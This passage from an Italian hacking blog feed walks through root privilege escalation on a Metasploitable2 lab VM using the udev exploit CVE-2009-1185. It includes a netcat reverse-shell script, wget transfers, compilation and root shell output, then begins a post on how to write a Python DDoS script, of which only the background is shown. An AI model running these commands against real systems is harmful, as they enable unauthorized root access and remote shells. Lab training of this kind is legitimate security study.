&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.34 (Ubuntu 10.10 x86) - &amp;#39;&lt;/span&gt;CAP_SYS_ADMIN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (1)                                                                        | linux_x86/local/15916.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.34 (Ubuntu 10.10 x86/x64) - &amp;#39;&lt;/span&gt;CAP_SYS_ADMIN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (2)                                                                    | linux/local/15944.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - &amp;#39;&lt;/span&gt;CAN BCM&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                         | linux/local/14814.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.36-rc4-git2 (x86-64) - &amp;#39;&lt;/span&gt;ia32syscall&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Emulation Privilege Escalation                                                                           | linux_x86-64/local/15023.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.36.2 (Ubuntu 10.04) - &amp;#39;&lt;/span&gt;Half-Nelson.c&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Econet Privilege Escalation                                                                             | linux/local/17787.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.37-rc2 - &amp;#39;&lt;/span&gt;ACPI custom_method&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                                      | linux/local/15774.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.7-rc3 (Slackware 9.1 / Debian 3.0) - &amp;#39;&lt;/span&gt;sys_chown&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Group Ownership Alteration Privilege Escalation                                            | linux/local/718.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - &amp;#39;&lt;/span&gt;xattr&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; Local Privilege Escalation                                                                   | linux/local/12130.py
Samba 2.2.8 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Linux Kernel 2.6 / Debian / Mandrake&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - Share Privilege Escalation                                                                                  | linux/local/23674.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Poiché stiamo cercando un exploit di privilage escalation, cerchiamo &lt;strong&gt;privilege&lt;/strong&gt;, quindi utilizziamo &lt;em&gt;grep&lt;/em&gt; per convogliare la nostra ricerca in risultati più ristretti ignorando maiuscole e minuscole con il flag &lt;em&gt;-i&lt;/em&gt;. Per questo esempio, utilizzeremo l&amp;rsquo;exploit 8572.c, che sfrutta un difetto nel gestore dispositivi UDEV, consentendo l&amp;rsquo;esecuzione del codice tramite un messaggio Netlink non verificato. Basta copiare la posizione dell&amp;rsquo;exploit e utilizzare il comando locate per trovare il percorso completo, che è &lt;strong&gt;/usr/share/exploitdb/exploits/linux/local/8572.c&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ locate linux/local/8572.c
/usr/share/exploitdb/exploits/linux/local/8572.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo exploit è scritto in C (da cui l&amp;rsquo;estensione .c), ma non dovremo preoccuparci del codice sorgente: verrà eseguito solo dopo averlo compilato, ma non fa male prendere l&amp;rsquo;abitudine di leggere codice per vedere esattamente cosa fa. Ora possiamo estrarre quel file per visualizzare le informazioni su questo exploit oltre a eventuali note per gli sviluppatori:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;* cve-2009-1185.c
*
* udev &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1141&lt;/span&gt; Local Privilege Escalation Exploit
* Jon Oberheide &amp;lt;jon@oberheide.org&amp;gt;
* http://jon.oberheide.org
*
* Information:
*
*   http://cvemitre.org/cgi-bin/cvename.cgi?name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;CVE-2009-1185
*
*   udev before 1.4.1 does not verify whether a NETLINK message originates
*   from kernel space, which allows local users to gain privileges by sending
*   a NETLINK message from user space.
*
* Notes:
*
*   An alternative version of kcope&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s exploit.  This exploit leverages the
*   95-udev-late.rules functionality that is meant to run arbitrary commands
*   when a device is removed.  A bit cleaner and reliable as long as you
*   distro ships that rule file.
*
*   Tested on Gentoo, Intrepid, and Jaunty.
*
* Usage:
*
*   Pass the PID of the udevd netlink socket &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;listed in /proc/net/netlink,
*   usually is the udevd PID minus 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; as argv&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.
*
*   The exploit will execute /tmp/run as root so throw whatever payload you
*   want in there.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per utilizzare questo exploit, deve trovarsi sulla macchina di destinazione. Il modo più semplice per farlo è ospitare il file su un server Apache locale sulla nostra macchina Kali, connettersi al server dalla macchina di destinazione e infine scaricare il file. Prima di farlo, tuttavia, è necessario compiere alcuni passaggi preparatori.&lt;/p&gt;
&lt;p&gt;Innanzitutto, dobbiamo assicurarci che il server sia attivo e funzionante su Kali, quindi eseguiamo &lt;strong&gt;service apache2 restart&lt;/strong&gt; nel terminale. Successivamente, possiamo creare un collegamento simbolico tra la directory in cui si trova l&amp;rsquo;exploit e la directory che serve i file sul server; Questo renderà l&amp;rsquo;exploit disponibile per il download. Per fare ciò, eseguiamo il seguente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo exploit verrà eseguito dalla directory /tmp in Metasploitable2, quindi prima dobbiamo creare il file che verrà eseguito. Su Kali ancora, digitiamo &lt;strong&gt;nano /var/www/html/run&lt;/strong&gt; e inserisci queste righe nel file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;nc 192.168.1.176 &lt;span style=&#34;color:#ae81ff&#34;&gt;4321&lt;/span&gt; -e /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Quando questo file viene eseguito, utilizzerà Netcat per connettersi all&amp;rsquo;indirizzo IP di Kali sulla porta 4321 e generare una shell. Premiamo &lt;em&gt;Ctrl-X&lt;/em&gt;, &lt;em&gt;Y&lt;/em&gt; e &lt;em&gt;Enter&lt;/em&gt; per salvare.&lt;/p&gt;
&lt;p&gt;Ora siamo pronti per caricare i file su Metasploitable2. Tornando alla nostra shell di basso livello, spostiamoci nella directory /tmp e utilizza l&amp;rsquo;utilità &lt;strong&gt;wget&lt;/strong&gt; per connetterci al server in esecuzione su Kali e trasferire i file su Metasploitable2:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cd /tmp
wget http://192.168.1.176/run
--15:18:31--  http://192.168.1.176/run
           &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;run&amp;#39;&lt;/span&gt;
Connecting to 192.168.1.176:80... connected.
HTTP request sent, awaiting response... &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;

    OK                                                  100%  978.43 KB/s

15:18:31 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;978.43 KB/s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;run&amp;#39;&lt;/span&gt; saved &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;46/46&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

wget http://192.168.1.176/local/8752.c
--15:19:24--  http://192.168.1.176/8572.c
           &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8572.c&amp;#39;&lt;/span&gt;
Connecting to 192.168.1.176:80... connected.
HTTP request sent, awaiting response... &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
Length: 2,876 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2.8K&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;text/x-csrc&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;

    OK                                                  100%  100.46 MB/s

15:19:24 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;100.46 MB/s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;8572.c&amp;#39;&lt;/span&gt; saved &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2876/2876&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora che i file necessari per eseguire questo exploit sono stati trasferiti con successo al nostro obiettivo, siamo quasi pronti per l&amp;rsquo;esecuzione. Poiché il file exploit è codificato in C, dobbiamo compilarlo in un eseguibile. Non entreremo nel dettaglio dei linguaggi compilati qui ma, fondamentalmente, c&amp;rsquo;è del codice sorgente che deve essere compilato per essere eseguito. Possiamo farlo su sistemi Linux usando GCC (GNU Compiler Collection).&lt;/p&gt;
&lt;p&gt;Eseguiamo il comando seguente per compilare il file exploit 8572.c in un eseguibile, utilizzando il flag &lt;strong&gt;-o&lt;/strong&gt; per specificare il nome del file di output:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gcc -o exploit 8572.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Se si lamenta di non trovare ld (il linker dinamico), possiamo usare il flag &lt;strong&gt;-B&lt;/strong&gt; per specificare dove dovrebbe trovarsi ld, in questo caso, sotto /usr/bin, in questo modo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gcc -B /usr/bin -o exploit 8572.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finalmente possiamo usare ls per verificare che il nostro file eseguibile sia stato compilato correttamente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gcc -o exploit 8572.c
collect2: cannont find &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ld&amp;#39;&lt;/span&gt;

gcc -B /usr/bin -o exploit 8572.c

ls
4674.jsvc_up
8572.c
exploit
jVswA
mhbkk
run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nella documentazione del file 8572.c, si dice che dobbiamo trovare il PID (identificatore di processo) del socket Netlink, che di solito è il PID del processo UDEVD meno uno. Possiamo farlo eseguendo &lt;strong&gt;cat /proc/net/netlink&lt;/strong&gt; e l&amp;rsquo;unico PID diverso da zero dovrebbe essere il numero che vogliamo. Verifica che sia corretto eseguendo &lt;strong&gt;ps aux | grep udev&lt;/strong&gt; — dovrebbe essere un numero più alto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cat /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
de313800 &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
dd15ca00 &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
dd657000 &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
de1afc00 &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
ddc0dc00 &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
de313c00 &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
ddc7ac00 &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2352&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;00000001&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
de38f800 &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
dd75a000 &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;        &lt;span style=&#34;color:#ae81ff&#34;&gt;00000000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Successivamente, dobbiamo impostare un listener sulla nostra macchina Kali in modo che quando viene eseguito lo script &amp;ldquo;run&amp;rdquo;, siamo in grado di catturare la shell. Su Kali, digita &lt;strong&gt;nc -lvp 4321&lt;/strong&gt; per ascoltare le connessioni in entrata.&lt;/p&gt;
&lt;p&gt;Ora che il nostro listener è aperto, possiamo finalmente sfruttare il bersaglio. Ricordiamoci di passare come argomento il PID di Netlink, in questo caso 2352, ma potrebbe essere sempre diverso. Eseguiamo il seguente comando nella shell di basso livello:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./exploit &lt;span style=&#34;color:#ae81ff&#34;&gt;2352&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Dopo alcuni istanti, una connessione dovrebbe riaprirsi sul nostro listener Netcat e possiamo eseguire comandi come &lt;strong&gt;id&lt;/strong&gt; e &lt;strong&gt;whoami&lt;/strong&gt; per visualizzare le informazioni dell&amp;rsquo;utente. Possiamo vedere che abbiamo ottenuto l&amp;rsquo;accesso a livello di root e da qui possiamo praticamente fare tutto ciò che vogliamo sul sistema:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ nc -lvp &lt;span style=&#34;color:#ae81ff&#34;&gt;4321&lt;/span&gt;
listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4321&lt;/span&gt; ...
192.168.1.245: inverse host lookup failed: Unknown host
connect to &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;192.168.1.176&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; from &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;192.168.1.245&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35612&lt;/span&gt;
id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Cos&#39;è un attacco DDoS e come farlo con Python</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</guid>
      <description>Table of Contents  Introduzione  Attacco Smurf Ping of death Attacco TCP SYN flood Come difender?  Firewall IDS     Cos&amp;rsquo;è un Attacco Denial of Service  Tipi di attacco DDoS  Attacchi volumetrici Attacchi ai protocolli Attacchi a livello di applicazione (L7)     Come realizzare uno script per il DDoS   Nel post di oggi andiamo a dare una panoramica di cos&amp;rsquo;è un attacco DDoS e come realizzare un semplice script python che lo esegue, per coloro di voi che sono interessati al tema degli attacchi di rete ho fatto un post anche su Brute Force FTP Server.</description>
      <content>&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#introduzione&#34;&gt;Introduzione&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#attacco-smurf&#34;&gt;Attacco Smurf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ping-of-death&#34;&gt;Ping of death&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#attacco-tcp-syn-flood&#34;&gt;Attacco TCP SYN flood&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#come-difender-&#34;&gt;Come difender?&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#firewall&#34;&gt;Firewall&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ids&#34;&gt;IDS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#cos-%C3%A8-un-attacco-denial-of-service&#34;&gt;Cos&amp;rsquo;è un Attacco Denial of Service&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#tipi-di-attacco-ddos&#34;&gt;Tipi di attacco DDoS&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#attacchi-volumetrici&#34;&gt;Attacchi volumetrici&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#attacchi-ai-protocolli&#34;&gt;Attacchi ai protocolli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#attacchi-a-livello-di-applicazione-l7-&#34;&gt;Attacchi a livello di applicazione (L7)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#come-realizzare-uno-script-per-il-ddos&#34;&gt;Come realizzare uno script per il DDoS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Nel post di oggi andiamo a dare una panoramica di cos&amp;rsquo;è un attacco DDoS e come realizzare un semplice script python che lo esegue, per coloro di voi
che sono interessati al tema degli attacchi di rete ho fatto un post anche su &lt;a href=&#34;https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/&#34;&gt;Brute Force FTP Server&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Di seguito vi mostrerò il frutto delle mie ricerche in questo ambito 👽.&lt;/p&gt;
&lt;h1 id=&#34;introduzione&#34;&gt;Introduzione&lt;/h1&gt;
&lt;p&gt;Wikipedia lo definisce come un attacco informatico che mira ad esaurire le risorse di un sistema informatico, mirando quindi a negare la disponibilità del servizio verso client benevoli. Come vedremo ci sono diverse modalità per esaurire la risorse di un servizio, ad esempio:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Congestione della rete&lt;/li&gt;
&lt;li&gt;Riempimento della memoria&lt;/li&gt;
&lt;li&gt;Avvelenamento della traduzione a dominio&lt;/li&gt;
&lt;li&gt;Riduzione della potenza di computazione&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Solitamente I DoS sono attacchi temporanei, atti a bloccare le risorse per tempi più o meno brevi, ma ci sono anche casi speciali in cui l’attacco porta ad un danneggiamento o distruzione completa del firmware, solitamente detti PDOs o phlashing. Questi attacchi sono una delle categorie più pericolose per un’azienda o ente che offre servizi via web, in quanto qualunque ‘nemico’ (come aziende concorrenti o governi) con abbastanza risorse potrebbe danneggiare irrimediabilmente la vittima. Chiunque compie questo attacco per divertimento o per “diletto” non ha compreso per nulla le potenzialità e la pericolosità dello stesso.&lt;/p&gt;
&lt;p&gt;Gli attacchi, in base alla modalità possono dividersi in:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Diretti&lt;/strong&gt;: l’attaccante colpisce in maniera diretta la vittima, senza utilizzare host di terze parti;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Indiretti&lt;/strong&gt;: l’attaccante, vuoi per anonimato, vuoi per poca potenza di banda, utilizza sistemi terzi per eseguire l’attacco.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;attacco-smurf&#34;&gt;Attacco Smurf&lt;/h2&gt;
&lt;p&gt;È stato il primo attacco DoS, lanciato verso gli anni ‘90. In esso l’attaccante invia un grande numero di richieste ICMP (Internet Control Message Protocol) ad un indirizzo broadcast. Essendo richieste echo venivano inviate a tutti i nodi partecipanti alla rete i quali rispondevano alla richiesta, inviando anche loro un messaggio, questa volta all’indirizzo IP vittima (lo spoofed IP), il quale veniva inondato letteralmente di pacchetti.&lt;/p&gt;
&lt;h2 id=&#34;ping-of-death&#34;&gt;Ping of death&lt;/h2&gt;
&lt;p&gt;L’attacco, utilizzato alla fine degli anni ‘90, utilizzava una grave vulnerabilità nel protocollo IP dei principali sistemi operativi. L’attaccante inviava un pacchetto IP malformato che causava un buffer overflow alla vittima e il conseguente blocco del servizio.&lt;/p&gt;
&lt;h2 id=&#34;attacco-tcp-syn-flood&#34;&gt;Attacco TCP SYN flood&lt;/h2&gt;
